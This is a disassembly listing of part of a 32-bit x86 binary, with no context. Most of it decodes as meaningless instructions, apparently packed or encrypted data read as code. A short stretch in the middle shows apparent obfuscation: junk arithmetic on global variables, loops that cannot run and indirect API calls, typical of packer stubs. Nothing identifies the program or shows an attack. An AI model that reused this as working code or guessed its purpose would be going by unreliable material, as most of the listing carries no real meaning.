  40a625:	shl    edx,cl
  40a627:	inc    ecx
  40a628:	sub    BYTE PTR gs:[eax-0x12d69eb2],0x8
  40a630:	mov    BYTE PTR [eax-0x53],dh
  40a633:	sbb    DWORD PTR [ecx],esi
  40a635:	loop   0x40a698
  40a637:	in     eax,0xc0
  40a639:	retf   0xd9f6
  40a63c:	(bad)  
  40a63d:	or     eax,0x1cd3fc58
  40a642:	lods   al,BYTE PTR ds:[esi]
  40a643:	adc    eax,0xc5872fbc
  40a648:	sar    DWORD PTR [esi+ecx*4-0x37953953],cl
  40a64f:	fstp   TBYTE PTR [esi+0x68]
  40a652:	dec    ebp
  40a653:	ficom  WORD PTR [eax-0x23]
  40a656:	cmc    
  40a657:	loop   0x40a61c
  40a659:	cli    
  40a65a:	push   edi
  40a65b:	pop    ss
  40a65c:	sbb    BYTE PTR [edx+0x4d],0xeb
  40a660:	clc    
  40a661:	iretw  
  40a663:	in     eax,0x98
  40a665:	clc    
  40a666:	xchg   esp,eax
  40a667:	mov    ecx,0x3f58a1c9
  40a66c:	mov    esi,0x37e27741
  40a671:	xor    DWORD PTR [ebp-0x30d71aff],ebp
  40a677:	fidiv  WORD PTR [edi]
  40a679:	test   al,0xcb
  40a67b:	mov    dl,0x36
  40a67d:	and    BYTE PTR [edi+0x4ead3ef0],bh
  40a683:	pop    esi
  40a684:	mov    bl,0x62
  40a686:	cmp    ebp,DWORD PTR [ebp+0x3107c811]
  40a68c:	popf   
  40a68d:	inc    ecx
  40a68e:	pop    ecx
  40a68f:	add    BYTE PTR [eax+0x23554f25],ah
  40a695:	cdq    
  40a696:	jle    0x40a655
  40a698:	retf   0x4c2d
  40a69b:	into   
  40a69c:	enter  0xc90,0x9
  40a6a0:	cmp    eax,DWORD PTR [esp+eax*4]
  40a6a3:	aad    0x86
  40a6a5:	out    dx,eax
  40a6a6:	jnp    0x40a655
  40a6a8:	arpl   WORD PTR [edx],sp
  40a6aa:	and    ebp,esp
  40a6ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6ad:	cmc    
  40a6ae:	pop    ds
  40a6af:	repnz rcl DWORD PTR [eax+edx*2+0x75],1
  40a6b4:	and    al,0xb0
  40a6b6:	nop
  40a6b7:	pop    ds
  40a6b8:	in     al,0x21
  40a6ba:	cmp    ebx,DWORD PTR ds:0x97e10c62
  40a6c0:	jp     0x40a645
  40a6c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6c3:	pop    ecx
  40a6c4:	sub    esp,edx
  40a6c6:	popa   
  40a6c7:	pop    ecx
  40a6c8:	jmp    0x9c43f6f
  40a6cd:	aad    0x1c
  40a6cf:	or     dl,dh
  40a6d1:	lahf   
  40a6d2:	sti    
  40a6d3:	sub    eax,0x55295cc2
  40a6d8:	lods   al,BYTE PTR ds:[esi]
  40a6d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6da:	test   eax,0xeeb04cf2
  40a6df:	and    esp,DWORD PTR [eax-0x6a182433]
  40a6e5:	outs   dx,DWORD PTR ds:[esi]
  40a6e6:	mov    edi,0xe7ffcf49
  40a6eb:	cs mov esp,0x6979075e
  40a6f1:	inc    esp
  40a6f2:	sbb    eax,0x47f4dc7e
  40a6f7:	lods   al,BYTE PTR ds:[esi]
  40a6f8:	mov    cl,0xf8
  40a6fa:	push   0xfffffff0
  40a6fc:	test   edx,0x315cd3dd
  40a702:	dec    edx
  40a703:	lahf   
  40a704:	mov    ch,0xcf
  40a706:	mov    al,ds:0x9ca5036d
  40a70b:	gs adc al,0x7b
  40a70e:	loop   0x40a698
  40a710:	ds or  al,0x58
  40a713:	jo     0x40a715
  40a715:	hlt    
  40a716:	in     eax,dx
  40a717:	lahf   
  40a718:	ret    
  40a719:	sub    cl,BYTE PTR [edi+0x59]
  40a71c:	fimul  DWORD PTR [edx]
  40a71e:	mov    esi,0x39e54557
  40a723:	mov    edx,0x91aa7dff
  40a728:	inc    eax
  40a729:	pop    edx
  40a72a:	(bad)
  40a72d:	push   cs
  40a72e:	sub    edx,DWORD PTR ds:0x22b9eced
  40a734:	call   0xee3b:0x33f650a9
  40a73b:	ror    cl,0x2e
  40a73e:	push   ebx
  40a73f:	jge    0x40a70f
  40a741:	daa    
  40a742:	pop    ds
  40a743:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a745:	xchg   ecx,eax
  40a746:	aaa    
  40a747:	repnz shl DWORD PTR [eax-0x4b],1
  40a74b:	xor    al,0xab
  40a74d:	test   DWORD PTR [ebp-0x6e3f522b],edx
  40a753:	jge    0x9f798e50
  40a759:	ror    DWORD PTR [esi+0x70],cl
  40a75c:	sbb    DWORD PTR [eax-0x3c2de832],ebp
  40a762:	ins    BYTE PTR es:[edi],dx
  40a763:	sbb    esi,DWORD PTR [edx]
  40a765:	mov    bh,0xe8
  40a767:	aas    
  40a768:	cmp    eax,0xdae46e3f
  40a76d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a76e:	leave  
  40a76f:	mov    al,0x45
  40a771:	or     dl,BYTE PTR [edi]
  40a773:	fcom   QWORD PTR [ebx-0x57]
  40a776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a777:	dec    edx
  40a778:	jae    0x40a7ac
  40a77a:	mov    al,dl
  40a77c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a77e:	(bad)  [edx-0x35ff52ff]
  40a784:	cmp    BYTE PTR [edi+0x7ee0aab9],cl
  40a78a:	inc    eax
  40a78b:	sub    dh,0xef
  40a78e:	sbb    al,0x14
  40a790:	fdiv   DWORD PTR [ecx*8+0x767befc9]
  40a797:	xor    al,0xaf
  40a799:	or     BYTE PTR [ebp-0x3a8931d],cl
  40a79f:	ret    
  40a7a0:	inc    esp
  40a7a1:	fistp  WORD PTR [ebp-0xd]
  40a7a4:	lock or edx,ebp
  40a7a7:	mov    esi,0x3a47b5a2
  40a7ac:	out    dx,al
  40a7ad:	push   cs
  40a7ae:	outs   dx,DWORD PTR ds:[esi]
  40a7af:	rcr    bl,0xb7
  40a7b2:	jge    0x40a742
  40a7b4:	clc    
  40a7b5:	and    dh,dl
  40a7b7:	lds    ecx,FWORD PTR [ecx]
  40a7b9:	jmp    0x40a7d3
  40a7bb:	push   0x6
  40a7bd:	lahf   
  40a7be:	push   cs
  40a7bf:	sub    al,0x41
  40a7c1:	cmp    edx,DWORD PTR [ebx+esi*4]
  40a7c4:	cmp    ebx,DWORD PTR ds:0xaf85b5ee
  40a7ca:	cmp    esp,eax
  40a7cc:	in     al,dx
  40a7cd:	scas   eax,DWORD PTR es:[edi]
  40a7ce:	xor    DWORD PTR [ecx+0x2aa5de63],edi
  40a7d4:	push   ebp
  40a7d5:	add    cl,BYTE PTR [esi]
  40a7d7:	ror    ah,1
  40a7d9:	in     al,dx
  40a7da:	fmul   QWORD PTR [edi+0x4c]
  40a7dd:	in     al,0x6
  40a7df:	jbe    0x40a839
  40a7e1:	inc    ecx
  40a7e2:	dec    eax
  40a7e3:	sbb    ch,dh
  40a7e5:	call   0xd949ecce
  40a7ea:	adc    BYTE PTR [edx],bl
  40a7ec:	imul   esp,DWORD PTR [edi],0xbb6f0cfb
  40a7f2:	mov    al,0x51
  40a7f4:	push   ebp
  40a7f5:	add    ebx,DWORD PTR [edx+0xa]
  40a7f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7f9:	cmp    dh,dh
  40a7fb:	dec    esi
  40a7fc:	push   0xe2a13e4e
  40a801:	push   ds
  40a802:	sbb    DWORD PTR [edi+eiz*1],ebx
  40a805:	mov    ecx,DWORD PTR [esi]
  40a807:	mov    dl,0xd8
  40a809:	repz pop ss
  40a80b:	test   BYTE PTR [ebp+0x3c],ch
  40a80e:	mov    ah,0x92
  40a810:	sbb    DWORD PTR [ecx-0x2],eax
  40a813:	fist   WORD PTR [ebp-0x6ad240e2]
  40a819:	sub    bl,cl
  40a81b:	and    edi,DWORD PTR [ecx+edi*1-0x6a84a655]
  40a822:	cmp    eax,0x3bdf823c
  40a827:	xor    DWORD PTR [esi+0x1bcef0ef],esp
  40a82d:	cld    
  40a82e:	jnp    0x40a89a
  40a830:	or     ch,BYTE PTR [esi-0x741cf5ba]
  40a836:	pop    ss
  40a837:	icebp  
  40a838:	add    DWORD PTR [esi],0xffffff83
  40a83b:	test   BYTE PTR [edi+edx*8],0x4f
  40a83f:	jb     0x40a809
  40a841:	xchg   edi,eax
  40a842:	ins    BYTE PTR es:[edi],dx
  40a843:	ror    DWORD PTR [ebx+esi*4-0x36afc016],0xd7
  40a84b:	inc    esi
  40a84c:	cmp    eax,DWORD PTR [ecx+0x69]
  40a84f:	mov    edx,?
  40a851:	aad    0x39
  40a853:	push   es
  40a854:	lea    esi,[eax+0x62]
  40a857:	push   ss
  40a858:	xor    ebx,0xffffff8d
  40a85b:	xchg   ebx,eax
  40a85c:	sub    dh,dh
  40a85e:	sbb    BYTE PTR [esi],bh
  40a860:	jnp    0x40a7fd
  40a862:	(bad)  
  40a863:	adc    eax,0x581102c6
  40a868:	mov    eax,0xfc591501
  40a86d:	pop    edx
  40a86e:	stos   BYTE PTR es:[edi],al
  40a86f:	and    al,0xb9
  40a871:	fcomp  st(2)
  40a873:	fisubr WORD PTR [esi]
  40a875:	adc    al,0x30
  40a877:	inc    eax
  40a878:	es repz xchg edi,eax
  40a87b:	cmp    ah,BYTE PTR [edi+0x5c]
  40a87e:	(bad)  
  40a87f:	add    eax,DWORD PTR [ebp+0x1fba5197]
  40a885:	jne    0x40a856
  40a887:	aam    0xf1
  40a889:	popa   
  40a88a:	mov    dl,BYTE PTR [edi+0x6543f33f]
  40a890:	and    al,0x7e
  40a892:	or     BYTE PTR [esi+edx*8],bh
  40a895:	aas    
  40a896:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a897:	add    BYTE PTR [ebp-0x6dc883fa],bl
  40a89d:	pushf  
  40a89e:	or     ebp,DWORD PTR [esi]
  40a8a0:	stos   BYTE PTR es:[edi],al
  40a8a1:	cwde   
  40a8a2:	imul   esp,edx,0xffffffd6
  40a8a5:	inc    esp
  40a8a6:	pop    esp
  40a8a7:	(bad)  
  40a8a8:	nop
  40a8a9:	push   eax
  40a8aa:	xchg   edi,eax
  40a8ab:	push   edx
  40a8ac:	test   al,0xb7
  40a8ae:	cs scas eax,DWORD PTR es:[edi]
  40a8b0:	push   ss
  40a8b1:	mov    ah,0x33
  40a8b3:	and    BYTE PTR [ebp-0x1a2e7fc5],0x93
  40a8ba:	jge    0x40a8d9
  40a8bc:	mov    ebx,0xe7c62d9f
  40a8c1:	dec    ebp
  40a8c2:	fist   WORD PTR [ebx-0x11]
  40a8c5:	inc    ecx
  40a8c6:	dec    ebx
  40a8c7:	xchg   cl,bl
  40a8c9:	inc    ebp
  40a8ca:	js     0x40a88a
  40a8cc:	pop    esi
  40a8cd:	cli    
  40a8ce:	cmp    eax,0x13ec925c
  40a8d3:	(bad)  
  40a8d4:	retf   0xd377
  40a8d7:	add    al,0x38
  40a8d9:	shl    BYTE PTR [edi-0x39],1
  40a8dc:	dec    eax
  40a8dd:	xchg   ebx,eax
  40a8de:	mov    edi,0xe408c071
  40a8e3:	jae    0x40a91f
  40a8e5:	into   
  40a8e6:	jb     0x40a8af
  40a8e8:	lahf   
  40a8e9:	scas   eax,DWORD PTR es:[edi]
  40a8ea:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8ec:	jne    0x40a93b
  40a8ee:	ret    0x2be5
  40a8f1:	pop    ebx
  40a8f2:	mov    eax,0xca3aceeb
  40a8f7:	aaa    
  40a8f8:	sbb    eax,0x6e9695e6
  40a8fd:	pop    edi
  40a8fe:	jb     0x40a970
  40a900:	mov    ds:0xcc2b7de5,eax
  40a905:	popf   
  40a906:	sbb    cl,ch
  40a908:	out    dx,al
  40a909:	es stc 
  40a90b:	xor    DWORD PTR [eax+0x2b],ebp
  40a90e:	adc    DWORD PTR [edi+0x3c],edi
  40a911:	mov    esp,0xbce05f29
  40a916:	jmp    0xfb869a35
  40a91b:	mov    edi,0xe1d61604
  40a920:	jle    0x40a90d
  40a922:	popa   
  40a923:	popw   ds
  40a925:	es ret 
  40a927:	sahf   
  40a928:	xchg   edi,eax
  40a929:	xor    bh,BYTE PTR [eax]
  40a92b:	repnz arpl WORD PTR [ebx+0x424e6877],dx
  40a932:	dec    edx
  40a933:	add    ch,BYTE PTR [esi+0x2dc43ff3]
  40a939:	js     0x40a96f
  40a93b:	idiv   edx
  40a93d:	int    0xa9
  40a93f:	add    BYTE PTR [ebp-0x3b],0xee
  40a943:	(bad)  
  40a944:	mov    edx,0x444af19f
  40a949:	inc    edi
  40a94a:	push   ecx
  40a94b:	mov    esi,0x4a47472c
  40a950:	mov    gs,WORD PTR [edx]
  40a952:	iret   
  40a953:	test   eax,0x2d2cd5a5
  40a958:	sbb    ecx,esp
  40a95a:	stos   DWORD PTR es:[edi],eax
  40a95b:	data16 mov bh,0x86
  40a95e:	stos   DWORD PTR es:[edi],eax
  40a95f:	jmp    0x40a913
  40a961:	loop   0x40a8e8
  40a963:	sbb    edi,DWORD PTR ds:0x1b6ff80b
  40a969:	ja     0x40a926
  40a96b:	inc    esp
  40a96c:	inc    ebx
  40a96d:	xlat   BYTE PTR ds:[ebx]
  40a96e:	cmc    
  40a96f:	cmp    DWORD PTR [esi],0xffffffbb
  40a972:	mov    eax,ds:0xb41c4d2c
  40a977:	retf   
  40a978:	cmp    al,0x1c
  40a97a:	sbb    DWORD PTR [edi+0x6cb15c70],esp
  40a980:	imul   esi,edi,0xffffffaf
  40a983:	sar    DWORD PTR [eax],1
  40a985:	scas   al,BYTE PTR es:[edi]
  40a986:	ret    0x5c02
  40a989:	xchg   ebp,eax
  40a98a:	mov    eax,ds:0x1d87a89c
  40a98f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a990:	push   cs
  40a991:	push   esi
  40a992:	or     DWORD PTR ds:0x428e7f,0x7ae1
  40a99c:	mov    esi,0x75108af
  40a9a1:	xor    eax,esi
  40a9a3:	push   edi
  40a9a4:	and    edi,0x47d2
  40a9aa:	mov    edi,0x3272f6
  40a9af:	and    DWORD PTR ds:0x428e57,0xe9
  40a9b9:	add    eax,edi
  40a9bb:	mov    DWORD PTR [ebp-0x1c],eax
  40a9be:	mov    eax,DWORD PTR [ebp+0x14]
  40a9c1:	adc    DWORD PTR ds:0x428e97,0x7644
  40a9cb:	test   eax,eax
  40a9cd:	je     0x40aa21
  40a9d3:	and    DWORD PTR ds:0x428e83,0x0
  40a9dd:	mov    eax,ds:0x428e83
  40a9e2:	inc    eax
  40a9e3:	mov    ds:0x428e83,eax
  40a9e8:	cmp    DWORD PTR ds:0x428e83,0x1e
  40a9ef:	jl     0x40aa18
  40a9f5:	jmp    0x40aa0b
  40a9fa:	push   DWORD PTR [ebp-0x24]
  40a9fd:	push   0x428e43
  40aa02:	push   DWORD PTR [ebp-0x10]
  40aa05:	call   DWORD PTR ds:0x42aa2f
  40aa0b:	cmp    DWORD PTR ds:0x428e83,0x17
  40aa12:	jb     0x40a9dd
  40aa18:	mov    eax,DWORD PTR [ebp+0x14]
  40aa1b:	mov    eax,DWORD PTR [eax]
  40aa1d:	dec    ebx
  40aa1e:	mov    DWORD PTR [ebp-0x1c],eax
  40aa21:	mov    eax,DWORD PTR [ebp-0x4]
  40aa24:	xor    DWORD PTR ds:0x428e2b,0x506a
  40aa2e:	xor    eax,esi
  40aa30:	and    DWORD PTR ds:0x428e7f,edi
  40aa36:	add    eax,edi
  40aa38:	mov    DWORD PTR [ebp-0x8],eax
  40aa3b:	mov    DWORD PTR ds:0x428e97,0x1e
  40aa45:	cmp    DWORD PTR ds:0x428e97,0x0
  40aa4c:	je     0x40aa81
  40aa52:	cmp    DWORD PTR ds:0x428e97,0x20
  40aa59:	jg     0x40aa81
  40aa5f:	jmp    0x40aa6f
  40aa64:	push   0x4281a7
  40aa69:	call   DWORD PTR ds:0x42a9fb
  40aa6f:	mov    ebx,DWORD PTR ds:0x428e97
  40aa75:	dec    ebx
  40aa76:	mov    DWORD PTR ds:0x428e97,ebx
  40aa7c:	jmp    0x40aa45
  40aa81:	mov    eax,DWORD PTR [ebp-0xc]
  40aa84:	add    DWORD PTR ds:0x428eaf,edx
  40aa8a:	xor    eax,esi
  40aa8c:	add    eax,edi
  40aa8e:	mov    ebx,DWORD PTR ds:0x429bbb
  40aa94:	mov    ebx,DWORD PTR [ebx]
  40aa96:	or     DWORD PTR ds:0x428ebb,ebx
  40aa9c:	mov    DWORD PTR [ebp-0x24],eax
  40aa9f:	and    DWORD PTR ds:0x428e27,0x0
  40aaa9:	jmp    0x40aabb
  40aaae:	mov    ebx,DWORD PTR ds:0x428e27
  40aab4:	inc    ebx
  40aab5:	mov    DWORD PTR ds:0x428e27,ebx
  40aabb:	cmp    DWORD PTR ds:0x428e27,0x13
  40aac2:	jae    0x40ce99
  40aac8:	cmp    DWORD PTR ds:0x428e27,0x18
  40aacf:	jle    0x40ce99
  40aad5:	jmp    0x40aae5
  40aada:	push   0x428173
  40aadf:	call   DWORD PTR ds:0x42a9ff
  40aae5:	jmp    0x40aaae
  40aaea:	jmp    0x40ce99
  40aaef:	dec    edx
  40aaf0:	shr    ah,1
  40aaf2:	shl    esp,0x9d
  40aaf5:	push   es
  40aaf6:	mov    bl,dl
  40aaf8:	adc    BYTE PTR [edx+0x6f],bh
  40aafb:	mov    dl,0x65
  40aafd:	pop    ebp
  40aafe:	mov    ecx,0x8383f6e7
  40ab03:	icebp  
  40ab04:	pusha  
  40ab05:	add    DWORD PTR [ebx-0x67e27e0b],0x75
  40ab0c:	cld    
  40ab0d:	jge    0x40aaa7
  40ab0f:	pusha  
  40ab10:	sbb    BYTE PTR [ebx],0xa9
  40ab13:	jo     0x40aaf4
  40ab15:	dec    edx
  40ab16:	shr    DWORD PTR es:[eax+ecx*1],cl
  40ab1a:	icebp  
  40ab1b:	mov    dh,0x9b
  40ab1d:	das    
  40ab1e:	cmc    
  40ab1f:	xor    BYTE PTR [eax+0x463847af],dl
  40ab25:	push   es
  40ab26:	mov    eax,ds:0x97e3ed3
  40ab2b:	mov    esp,0x9d3f640e
  40ab30:	daa    
  40ab31:	dec    ecx
  40ab32:	gs jne 0x40abac
  40ab35:	into   
  40ab36:	or     BYTE PTR [edi-0x50],cl
  40ab39:	push   esi
  40ab3a:	pop    esi
  40ab3b:	mov    ah,0xda
  40ab3d:	sbb    eax,0x762778bc
  40ab42:	inc    ebx
  40ab43:	fist   WORD PTR [ebp+0x1a]
  40ab46:	repnz dec edi
  40ab48:	mov    ds:0xf9fc67fc,eax
  40ab4d:	mov    eax,ds:0xbcd2a8e9
  40ab52:	xchg   ebx,eax
  40ab53:	xlat   BYTE PTR ds:[ebx]
  40ab54:	mov    BYTE PTR [edx],cl
  40ab56:	mov    bh,0x3d
  40ab58:	int    0xd
  40ab5a:	pop    ds
  40ab5b:	idiv   edx
  40ab5d:	sbb    DWORD PTR [eax+edx*2],0xb
  40ab61:	mov    eax,edx
  40ab63:	aam    0x32
  40ab65:	inc    esi
  40ab66:	fwait
  40ab67:	imul   edx,DWORD PTR [ebp+0x6fb89b09],0x7b
  40ab6e:	jmp    0x40aafb
  40ab70:	sub    cl,BYTE PTR [ebx+0x6103eadd]
  40ab76:	dec    eax
  40ab77:	inc    ebx
  40ab78:	ret    0xa7
  40ab7b:	std    
  40ab7c:	call   0x1189:0x67ca622f
  40ab83:	fs push edi
  40ab85:	push   ebp
  40ab86:	js     0x40ab51
  40ab88:	mov    es,WORD PTR [ebx+edx*1]
  40ab8b:	inc    ebp
  40ab8c:	cmp    BYTE PTR [edx],ch
  40ab8e:	or     dl,cl
  40ab90:	jg     0x40abf3
  40ab92:	ins    DWORD PTR es:[edi],dx
  40ab93:	mov    dl,0x83
  40ab95:	outs   dx,DWORD PTR ds:[esi]
  40ab96:	loopne 0x40abe4
  40ab98:	jle    0x40ac06
  40ab9a:	cli    
  40ab9b:	sub    al,0xd8
  40ab9d:	cli    
  40ab9e:	dec    edx
  40ab9f:	cld    
  40aba0:	and    DWORD PTR [eax+eax*4+0x30],edi
  40aba4:	xchg   esi,eax
  40aba5:	icebp  
  40aba6:	stc    
  40aba7:	xchg   BYTE PTR [edi],dl
  40aba9:	std    
  40abaa:	(bad)  
  40abab:	adc    eax,0x5c61f68c
  40abb0:	pop    esp
  40abb1:	ins    DWORD PTR es:[edi],dx
  40abb2:	push   edx
  40abb3:	mov    ecx,0x40a490d7
  40abb8:	idiv   BYTE PTR [ebp+0x3e727134]
  40abbe:	and    bl,dl
  40abc0:	int3   
  40abc1:	adc    eax,0x3e11651f
  40abc6:	(bad)  
  40abc8:	push   edi
  40abc9:	xor    ch,BYTE PTR [esi+0x1c]
  40abcc:	jp     0x40ab8e
  40abce:	sbb    BYTE PTR [ecx-0x135b006],bh
  40abd4:	es adc al,0x1f
  40abd7:	jae    0x40ab6e
  40abd9:	mov    esp,0x4b724027
  40abde:	ret    
  40abdf:	xlat   BYTE PTR ds:[ebx]
  40abe0:	mov    cl,BYTE PTR [edi]
  40abe2:	and    cl,BYTE PTR [esi+0x3b]
  40abe5:	cld    
  40abe6:	cmp    ebx,DWORD PTR [edi+ebp*8-0x8]
  40abea:	pop    ds
  40abeb:	(bad)  
  40abed:	neg    BYTE PTR [edx-0x1bb6c330]
  40abf3:	xor    esi,esp
  40abf5:	cmp    BYTE PTR [edi-0x5e],dh
  40abf8:	fwait
  40abf9:	xchg   ecx,eax
  40abfa:	jmp    0x40ac33
  40abfc:	fld    QWORD PTR [ebp+0x7e]
  40abff:	jge    0x40ac64
  40ac01:	aas    
  40ac02:	push   esp
  40ac03:	push   cs
  40ac04:	ja     0x40ab8d
  40ac06:	nop
  40ac07:	mov    DWORD PTR [esi],ebx
  40ac09:	rol    DWORD PTR [edi+0xa04f16a],1
  40ac0f:	mov    bl,0xec
  40ac11:	mov    edi,0x7855874b
  40ac16:	add    ah,cl
  40ac18:	xchg   ebp,eax
  40ac19:	lods   eax,DWORD PTR ds:[esi]
  40ac1a:	loop   0x40abcf
  40ac1c:	mov    gs,WORD PTR [ebp-0x67]
  40ac1f:	mov    BYTE PTR [edx],bh
  40ac21:	adc    edx,esi
  40ac23:	xor    al,0x2f
  40ac25:	sahf   
  40ac26:	inc    ebp
  40ac27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac28:	retf   0x468
  40ac2b:	scas   eax,DWORD PTR es:[edi]
  40ac2c:	push   ss
  40ac2d:	xchg   esi,eax
  40ac2e:	cld    
  40ac2f:	jmp    DWORD PTR [edi]
  40ac31:	mov    edx,0xae55cdd2
  40ac36:	loopne 0x40ac02
  40ac38:	aam    0xc4
  40ac3a:	jae    0x40abcc
  40ac3c:	cmova  esi,DWORD PTR [ebp+0x64a657d2]
  40ac43:	xchg   edx,eax
  40ac44:	dec    ebx
  40ac45:	push   ecx
  40ac46:	mov    ds:0x6d0ac1e5,eax
  40ac4b:	ror    DWORD PTR [edx-0x6e],cl
  40ac4e:	mov    cl,0xf6
  40ac50:	imul   di,WORD PTR [esi-0x14],0xede0
  40ac56:	pop    eax
  40ac57:	push   ecx
  40ac58:	add    al,0x3b
  40ac5a:	fld    st(6)
  40ac5c:	cwde   
  40ac5d:	push   esp
  40ac5e:	stos   BYTE PTR es:[edi],al
  40ac5f:	fistp  DWORD PTR [esi+0x13]
  40ac62:	enter  0xf5d,0x43
  40ac66:	call   0xa138f4bc
  40ac6b:	push   0xf49c815b
  40ac70:	sub    al,0xcf
  40ac72:	lock outs dx,DWORD PTR ds:[esi]
  40ac74:	xchg   ecx,eax
  40ac75:	std    
  40ac76:	jnp    0x40aca2
  40ac78:	sub    dl,BYTE PTR [edi+0x442d4b1f]
  40ac7e:	sar    BYTE PTR [ebp+0xc],1
  40ac81:	xor    edx,edx
  40ac83:	xlat   BYTE PTR ds:[ebx]
  40ac84:	dec    ebp
  40ac85:	rol    dh,1
  40ac87:	mov    bh,0x3b
  40ac89:	fild   QWORD PTR [ecx-0x37]
  40ac8c:	or     al,0xcb
  40ac8e:	cmp    eax,DWORD PTR [esp+edi*4+0x54cc82fa]
  40ac95:	xor    BYTE PTR [edi+0x4b69dd6a],bl
  40ac9b:	lea    esi,[esi]
  40ac9d:	in     eax,0x4b
  40ac9f:	push   ss
  40aca0:	mov    ebp,ss
  40aca2:	cld    
  40aca3:	das    
  40aca4:	xor    DWORD PTR [edx-0x59],edi
  40aca7:	push   ecx
  40aca8:	cli    
  40aca9:	dec    ebx
  40acaa:	and    BYTE PTR [edx+0x16d71083],bl
  40acb0:	into   
  40acb1:	inc    edi
  40acb2:	test   DWORD PTR ds:0xd9a6f554,0x15b45c60
  40acbc:	hlt    
  40acbd:	scas   al,BYTE PTR es:[edi]
  40acbe:	sub    DWORD PTR [ebp+0x201e4e79],esp
  40acc4:	loop   0x40ace0
  40acc6:	fwait
  40acc7:	jb     0x40acd5
  40acc9:	cmp    bl,BYTE PTR [esi+0x7fd1d5cb]
  40accf:	jmp    0xd6b1:0xc80a7209
  40acd6:	imul   ecx,DWORD PTR [edi+0x3c3ceef1],0xffffffd1
  40acdd:	cmc    
  40acde:	pop    esi
  40acdf:	xchg   esp,eax
  40ace0:	dec    eax
  40ace1:	push   esi
  40ace2:	and    al,BYTE PTR [edi+0x26]
  40ace5:	jmp    0x40ad4f
  40ace7:	pushf  
  40ace8:	dec    edx
  40ace9:	cli    
  40acea:	xor    DWORD PTR [eax+0x36],edx
  40aced:	aaa    
  40acee:	xchg   ecx,eax
  40acef:	and    BYTE PTR [ebx-0x77d80c57],ah
  40acf5:	repz xor eax,DWORD PTR [ebp-0x4f687eca]
  40acfc:	add    eax,DWORD PTR [ebx]
  40acfe:	cmp    BYTE PTR [esi+0x4c684249],bl
  40ad04:	aas    
  40ad05:	xchg   ecx,eax
  40ad06:	xor    DWORD PTR [ebp-0x531aa270],ecx
  40ad0c:	lahf   
  40ad0d:	mov    ebp,0xf17ab549
  40ad12:	sahf   
  40ad13:	out    dx,eax
  40ad14:	dec    ebp
  40ad15:	cdq    
  40ad16:	cwde   
  40ad17:	addr16 (bad) 
  40ad19:	mov    esp,0x2f950f19
  40ad1e:	xor    BYTE PTR [ecx-0x4850e5ff],bl
  40ad24:	mov    ah,0xfc
  40ad26:	cmp    BYTE PTR [esi-0x3c93d19c],bh
  40ad2c:	cmp    ah,BYTE PTR [ecx-0x4]
  40ad2f:	mov    ah,0x4f
  40ad31:	jle    0x40ad5f
  40ad33:	pop    edi
  40ad34:	cli    
  40ad35:	jl     0x40ad51
  40ad37:	push   edx
  40ad38:	hlt    
  40ad39:	cmp    ebp,ecx
  40ad3b:	inc    esi
  40ad3c:	adc    cl,bh
  40ad3e:	aas    
  40ad3f:	or     al,BYTE PTR [ebx-0xb438d0a]
  40ad45:	fimul  WORD PTR [ebx-0x24]
  40ad48:	inc    ebp
  40ad49:	dec    edx
  40ad4a:	mov    dl,0xa
  40ad4c:	jns    0x40acfe
  40ad4e:	mov    al,ds:0xc372bdae
  40ad53:	dec    ebx
  40ad54:	mov    ds:0xc9df0955,eax
  40ad59:	xchg   esi,eax
  40ad5a:	in     al,0x48
  40ad5c:	mov    eax,ds:0xa7537bfa
  40ad61:	adc    eax,0xa121060d
  40ad66:	fldenv [ebp-0x68]
  40ad69:	mov    esi,0xc3539455
  40ad6e:	mov    ebx,0x798c1f3
  40ad73:	xor    BYTE PTR [ebp-0x3916bc21],bh
  40ad79:	mov    ebp,ebx
  40ad7b:	cld    
  40ad7c:	xor    cl,dh
  40ad7e:	add    esi,esp
  40ad80:	sbb    al,0x6a
  40ad82:	(bad)  
  40ad84:	adc    al,0x7
  40ad86:	push   es
  40ad87:	dec    edi
  40ad88:	sti    
  40ad89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad8a:	push   esp
  40ad8b:	test   al,ch
  40ad8d:	into   
  40ad8e:	pop    eax
  40ad8f:	lahf   
  40ad90:	cmp    DWORD PTR [ebx+0x493a1905],esi
  40ad96:	ror    bh,1
  40ad98:	mov    ds,ebp
  40ad9a:	xor    eax,0xf7f5c6df
  40ad9f:	mov    bl,0xbe
  40ada1:	clc    
  40ada2:	sbb    BYTE PTR [ecx-0x543104ea],0xf4
  40ada9:	add    BYTE PTR [eax-0x2d],cl
  40adac:	cld    
  40adad:	xor    eax,0x8a8992d6
  40adb2:	inc    ebp
  40adb3:	xor    ebx,DWORD PTR [edx+0x59]
  40adb6:	int    0xc
  40adb8:	iret   
  40adb9:	add    al,0xb8
  40adbb:	aaa    
  40adbc:	sbb    eax,0x1675d786
  40adc1:	or     DWORD PTR [edx],esi
  40adc3:	or     BYTE PTR [ecx-0x2b0e00b8],0x22
  40adca:	sbb    eax,0xd892b0b2
  40adcf:	mov    ds:0x307f69b7,al
  40add4:	nop
  40add5:	sar    ch,1
  40add7:	idiv   BYTE PTR [ebp-0x4ebe84e]
  40addd:	push   0x6c72271b
  40ade2:	ja     0x40adde
  40ade4:	push   eax
  40ade5:	test   eax,0xc71c9bdc
  40adea:	sbb    eax,ebx
  40adec:	fwait
  40aded:	pop    ds
  40adee:	addr16 sbb eax,0xf9eba420
  40adf4:	adc    BYTE PTR [edx],bl
  40adf6:	or     bl,dl
  40adf8:	jp     0x40ad7a
  40adfa:	add    ch,BYTE PTR [ebp-0x7553472e]
  40ae00:	jge    0x40ad82
  40ae02:	push   ss
  40ae03:	cmc    
  40ae04:	adc    DWORD PTR [edx-0x79],edx
  40ae07:	push   edi
  40ae08:	mov    ds:0xcf424b64,eax
  40ae0d:	inc    ebx
